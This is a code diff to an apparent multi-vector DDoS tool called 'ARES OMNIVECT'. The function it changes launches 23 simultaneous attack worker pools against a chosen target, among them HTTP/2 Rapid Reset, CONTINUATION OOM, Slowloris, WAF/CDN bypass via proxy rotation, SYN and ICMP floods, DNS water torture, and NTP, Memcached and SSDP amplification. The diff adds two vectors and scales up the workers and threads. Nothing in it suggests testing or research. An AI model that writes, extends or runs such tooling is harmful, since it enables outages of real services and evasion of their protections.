@@ -235,34 +235,38 @@ async function runAttackWorkers(
   // Vector 14: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
   // Vector 15: H2 Settings Storm       — SETTINGS oscillation + WINDOW_UPDATE: 326K pps proved
   // Vector 16: HTTP Pipeline Flood     — HTTP/1.1 pipelining 128 req/write, 300K req/s, no wait
-  // Vector 17: ICMP Flood              — real ICMP echo request flood, L3 bandwidth saturation
+  // Vector 17: HTTP Bypass [NEW]       — Chrome fingerprint + proxy rotation, bypasses WAF/CDN per-IP limits
+  // Vector 18: SYN Flood   [NEW]       — pure TCP SYN_RECV table exhaustion before handshake, L4 layer
+  // Vector 19: ICMP Flood              — real ICMP echo request flood, L3 bandwidth saturation
   //                                       (raw-socket Tier 1 / hping3 Tier 2 / UDP saturation Tier 3)
-  // Vector 18: DNS Water Torture       — floods target NS servers with random subdomains (bypasses CDN!)
+  // Vector 20: DNS Water Torture       — floods target NS servers with random subdomains (bypasses CDN!)
   //                                       forces recursive resolution, fills NXDOMAIN cache, no WAF
-  // Vector 19: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests to port 123
-  // Vector 20: Memcached UDP Flood     — real binary Memcached protocol to port 11211
-  // Vector 21: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
+  // Vector 21: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests to port 123
+  // Vector 22: Memcached UDP Flood     — real binary Memcached protocol to port 11211
+  // Vector 23: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
   //
-  // ★ 32GB RAM / 8 vCPU optimized — ARES OMNIVECT: 21 simultaneous real attack vectors.
+  // ★ 32GB RAM / 8 vCPU optimized — ARES OMNIVECT: 23 simultaneous real attack vectors.
   // I/O-bound vectors (network + socket) — N > 8 workers is fine, each owns its own event loop.
   // CPU-intensive vectors (H2 RST, TLS Renego RSA, H2 CONTINUATION OOM) get extra workers.
   // UDP/L3 vectors use a single worker with high socket concurrency (no multi-worker UDP lock).
   if (method === "geass-override") {
-    const connW   = 2;  // 2×: double connection flood workers for nginx exhaustion
-    const slowW   = 2;  // 2×: 2 workers × 50K Slowloris = 100K half-open connections
-    const h2W     = Math.max(4, Math.ceil(CPU_COUNT * 0.40));  // ≥4 — CVE-2023-44487 PING+RST dominant
-    const contW   = Math.max(4, Math.ceil(CPU_COUNT * 0.30));  // ≥4 — CVE-2024-27316 OOM (16KB frames)
-    const hpackW  = Math.max(3, Math.ceil(CPU_COUNT * 0.25));  // ≥3 — HPACK table eviction
-    const wafW    = Math.max(3, Math.ceil(CPU_COUNT * 0.25));  // ≥3 — CF/Akamai bypass fingerprint
-    const wsW     = 1;
-    const gqlW    = 1;
-    const rudyW   = 2;  // 2×: multipart + classic RUDY
-    const cacheW  = 1;
-    const tlsW    = Math.max(2, Math.ceil(CPU_COUNT * 0.15));  // ≥2 — RSA renegotiation is CPU intensive
+    const connW   = 3;  // 3×: triple connection flood workers for nginx exhaustion
+    const slowW   = 3;  // 3×: 3 workers × 50K Slowloris = 150K half-open connections
+    const h2W     = Math.max(8, Math.ceil(CPU_COUNT * 0.70));  // ≥8 — CVE-2023-44487 dominant, I/O-bound
+    const contW   = Math.max(6, Math.ceil(CPU_COUNT * 0.50));  // ≥6 — CVE-2024-27316 OOM memory pressure
+    const hpackW  = Math.max(4, Math.ceil(CPU_COUNT * 0.35));  // ≥4 — HPACK table eviction
+    const wafW    = Math.max(4, Math.ceil(CPU_COUNT * 0.35));  // ≥4 — CF/Akamai bypass fingerprint
+    const wsW     = 2;  // 2× WebSocket goroutine exhaustion
+    const gqlW    = 2;  // 2× GraphQL exponential resolver
+    const rudyW   = 3;  // 3×: multipart slow POST
+    const cacheW  = 2;  // 2× CDN cache eviction
+    const tlsW    = Math.max(3, Math.ceil(CPU_COUNT * 0.25));  // ≥3 — RSA renegotiation CPU intensive
     const quicW   = 1;  // QUIC/H3 — UDP single worker
-    const sslW    = 1;  // SSL Death Record
-    const stormW  = Math.max(3, Math.ceil(CPU_COUNT * 0.30));  // ≥3 — H2 Settings Storm
-    const pipeW   = Math.max(3, Math.ceil(CPU_COUNT * 0.28));  // ≥3 — HTTP Pipeline 300K req/s per worker
+    const sslW    = 2;  // 2× SSL Death Record — 1-byte AES-GCM records
+    const stormW  = Math.max(6, Math.ceil(CPU_COUNT * 0.55));  // ≥6 — H2 Settings Storm (proven 326K pps)
+    const pipeW   = Math.max(6, Math.ceil(CPU_COUNT * 0.60));  // ≥6 — HTTP Pipeline 300K req/s per worker
+    const bypassW = Math.max(4, Math.ceil(CPU_COUNT * 0.35));  // ≥4 — Chrome fingerprint WAF bypass [NEW v22]
+    const synW    = 2;  // 2× SYN flood — TCP connection table exhaustion   [NEW v23]
     // L3/UDP vectors — each uses a single worker with high socket concurrency
     const icmpW   = 1;  // ICMP Flood — raw-socket / hping3 / UDP saturation
     const dnsW    = 1;  // DNS Water Torture — floods target NS servers
@@ -270,30 +274,32 @@ async function runAttackWorkers(
     const memW    = 1;  // Memcached UDP flood
     const ssdpW   = 1;  // SSDP M-SEARCH flood
 
-    // Thread budget — 32GB/8vCPU optimized (21-vector ARES OMNIVECT split)
-    // Heavy hitters: H2 RST, H2 CONTINUATION, H2 Storm, WAF Bypass, HTTP Pipeline
-    const connT   = Math.max(100, Math.round(threads * 0.06));
-    const slowT   = Math.max(100, Math.round(threads * 0.06));
-    const h2T     = Math.max(800, Math.round(threads * 0.26)); // ★ CVE-2023-44487 dominant  (32GB: 800 min)
-    const contT   = Math.max(650, Math.round(threads * 0.20)); // ★ CVE-2024-27316 OOM       (32GB: 650 min)
-    const hpackT  = Math.max(400, Math.round(threads * 0.15)); // ★ HPACK eviction storm     (32GB: 400 min)
-    const wafT    = Math.max(400, Math.round(threads * 0.18)); // ★ CF/Akamai WAF bypass     (32GB: 400 min)
-    const wsT     = Math.max(80,  Math.round(threads * 0.06));
-    const gqlT    = Math.max(50,  Math.round(threads * 0.04));
-    const udpT    = Math.max(64,  Math.round(threads * 0.04));
-    const rudyT   = Math.max(60,  Math.round(threads * 0.05));
-    const cacheT  = Math.max(50,  Math.round(threads * 0.04));
-    const tlsT    = Math.max(50,  Math.round(threads * 0.04));
-    const quicT   = Math.max(32,  Math.round(threads * 0.03));
-    const sslT    = Math.max(60,  Math.round(threads * 0.05));
-    const stormT  = Math.max(400, Math.round(threads * 0.22)); // ★ H2 Settings Storm proven  (32GB: 400 min)
-    const pipeT   = Math.max(1200, Math.round(threads * 0.32)); // ★ HTTP Pipeline 300K req/s  (32GB: 1200 min)
+    // Thread budget — 32GB/8vCPU optimized (23-vector ARES OMNIVECT split)
+    // Heavy hitters: H2 RST, H2 CONTINUATION, H2 Storm, WAF Bypass, HTTP Pipeline, HTTP Bypass
+    const connT   = Math.max(200, Math.round(threads * 0.08));
+    const slowT   = Math.max(200, Math.round(threads * 0.08));
+    const h2T     = Math.max(1500, Math.round(threads * 0.32)); // ★ CVE-2023-44487 dominant   (32GB: 1500 min)
+    const contT   = Math.max(1000, Math.round(threads * 0.24)); // ★ CVE-2024-27316 OOM        (32GB: 1000 min)
+    const hpackT  = Math.max(600, Math.round(threads * 0.18));  // ★ HPACK eviction storm      (32GB: 600 min)
+    const wafT    = Math.max(600, Math.round(threads * 0.20));  // ★ CF/Akamai WAF bypass      (32GB: 600 min)
+    const wsT     = Math.max(150, Math.round(threads * 0.08));
+    const gqlT    = Math.max(100, Math.round(threads * 0.06));
+    const udpT    = Math.max(128, Math.round(threads * 0.06));
+    const rudyT   = Math.max(120, Math.round(threads * 0.07));
+    const cacheT  = Math.max(100, Math.round(threads * 0.06));
+    const tlsT    = Math.max(100, Math.round(threads * 0.06));
+    const quicT   = Math.max(64,  Math.round(threads * 0.04));
+    const sslT    = Math.max(200, Math.round(threads * 0.08));  // raised: 1-byte AES-GCM CPU drain
+    const stormT  = Math.max(800, Math.round(threads * 0.26));  // ★ H2 Settings Storm         (32GB: 800 min)
+    const pipeT   = Math.max(2000, Math.round(threads * 0.40)); // ★ HTTP Pipeline 300K req/s  (32GB: 2000 min)
+    const bypassT = Math.max(500, Math.round(threads * 0.18));  // ★ Chrome bypass proxy flood [NEW v22, 32GB: 500 min]
+    const synT    = Math.max(1024, Math.round(threads * 0.12)); // ★ SYN flood TCP table       [NEW v23, 32GB: 1024 min]
     // L3/UDP — each gets its own thread pool; single worker uses all threads as socket count
-    const icmpT   = Math.max(512, Math.round(threads * 0.08)); // ICMP: 512 sockets → multi-Gbps saturation
-    const dnsT    = Math.max(512, Math.round(threads * 0.06)); // DNS Water Torture: 512 UDP sockets
-    const ntpT    = Math.max(512, Math.round(threads * 0.05)); // NTP mode 7 monlist: 512 sockets
-    const memT    = Math.max(256, Math.round(threads * 0.05)); // Memcached binary UDP: 256 sockets
-    const ssdpT   = Math.max(256, Math.round(threads * 0.05)); // SSDP M-SEARCH: 256 sockets
+    const icmpT   = Math.max(1024, Math.round(threads * 0.12)); // ICMP: 1024 sockets → multi-Gbps saturation
+    const dnsT    = Math.max(1024, Math.round(threads * 0.08)); // DNS Water Torture: 1024 UDP sockets
+    const ntpT    = Math.max(1024, Math.round(threads * 0.07)); // NTP mode 7 monlist: 1024 sockets
+    const memT    = Math.max(512, Math.round(threads * 0.06));  // Memcached binary UDP: 512 sockets
+    const ssdpT   = Math.max(512, Math.round(threads * 0.06));  // SSDP M-SEARCH: 512 sockets
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -307,27 +313,29 @@ async function runAttackWorkers(
     };
 
     await Promise.all([
-      spawnPool("conn-flood",         target, port, connT,  connW,  signal, makeGeassOnStats("conn")),
-      spawnPool("slowloris",          target, port, slowT,  slowW,  signal, makeGeassOnStats("slow")),
-      spawnPool("http2-flood",        target, port, h2T,    h2W,    signal, onStats),
-      spawnPool("http2-continuation", target, port, contT,  contW,  signal, onStats),
-      spawnPool("hpack-bomb",         target, port, hpackT, hpackW, signal, onStats),
-      spawnPool("waf-bypass",         target, port, wafT,   wafW,   signal, onStats),
-      spawnPool("ws-flood",           target, port, wsT,    wsW,    signal, makeGeassOnStats("ws")),
-      spawnPool("graphql-dos",        target, port, gqlT,   gqlW,   signal, onStats),
-      spawnPool("udp-flood",          target, port, udpT,   1,      signal, onStats),
-      spawnPool("rudy-v2",            target, port, rudyT,  rudyW,  signal, makeGeassOnStats("rudy")),
-      spawnPool("cache-poison",       target, port, cacheT, cacheW, signal, onStats),
-      spawnPool("tls-renego",         target, port, tlsT,   tlsW,   signal, makeGeassOnStats("tls")),
-      spawnPool("quic-flood",         target, port, quicT,  quicW,  signal, onStats),
-      spawnPool("ssl-death",          target, port, sslT,   sslW,   signal, makeGeassOnStats("ssl")),
-      spawnPool("h2-settings-storm",  target, port, stormT, stormW, signal, onStats),  // Vector 14
-      spawnPool("http-pipeline",      target, port, pipeT,  pipeW,  signal, onStats),  // Vector 15 NEW
-      spawnPool("icmp-flood",         target, port, icmpT,  icmpW,  signal, onStats),  // Vector 16
-      spawnPool("dns-amp",            target, port, dnsT,   dnsW,   signal, onStats),  // Vector 17
-      spawnPool("ntp-amp",            target, port, ntpT,   ntpW,   signal, onStats),  // Vector 18
-      spawnPool("mem-amp",            target, port, memT,   memW,   signal, onStats),  // Vector 19
-      spawnPool("ssdp-amp",           target, port, ssdpT,  ssdpW,  signal, onStats),  // Vector 20
+      spawnPool("conn-flood",         target, port, connT,   connW,   signal, makeGeassOnStats("conn")),
+      spawnPool("slowloris",          target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),
+      spawnPool("http2-flood",        target, port, h2T,     h2W,     signal, onStats),
+      spawnPool("http2-continuation", target, port, contT,   contW,   signal, onStats),
+      spawnPool("hpack-bomb",         target, port, hpackT,  hpackW,  signal, onStats),
+      spawnPool("waf-bypass",         target, port, wafT,    wafW,    signal, onStats),
+      spawnPool("ws-flood",           target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),
+      spawnPool("graphql-dos",        target, port, gqlT,    gqlW,    signal, onStats),
+      spawnPool("udp-flood",          target, port, udpT,    1,       signal, onStats),
+      spawnPool("rudy-v2",            target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")),
+      spawnPool("cache-poison",       target, port, cacheT,  cacheW,  signal, onStats),
+      spawnPool("tls-renego",         target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),
+      spawnPool("quic-flood",         target, port, quicT,   quicW,   signal, onStats),
+      spawnPool("ssl-death",          target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),
+      spawnPool("h2-settings-storm",  target, port, stormT,  stormW,  signal, onStats),  // Vector 15
+      spawnPool("http-pipeline",      target, port, pipeT,   pipeW,   signal, onStats),  // Vector 16
+      spawnPool("http-bypass",        target, port, bypassT, bypassW, signal, onStats),  // Vector 17 NEW — Chrome bypass
+      spawnPool("syn-flood",          target, port, synT,    synW,    signal, onStats),  // Vector 18 NEW — SYN table exhaust
+      spawnPool("icmp-flood",         target, port, icmpT,   icmpW,   signal, onStats),  // Vector 19
+      spawnPool("dns-amp",            target, port, dnsT,    dnsW,    signal, onStats),  // Vector 20
+      spawnPool("ntp-amp",            target, port, ntpT,    ntpW,    signal, onStats),  // Vector 21
+      spawnPool("mem-amp",            target, port, memT,    memW,    signal, onStats),  // Vector 22
+      spawnPool("ssdp-amp",           target, port, ssdpT,   ssdpW,   signal, onStats),  // Vector 23
     ]);
     return;
   }
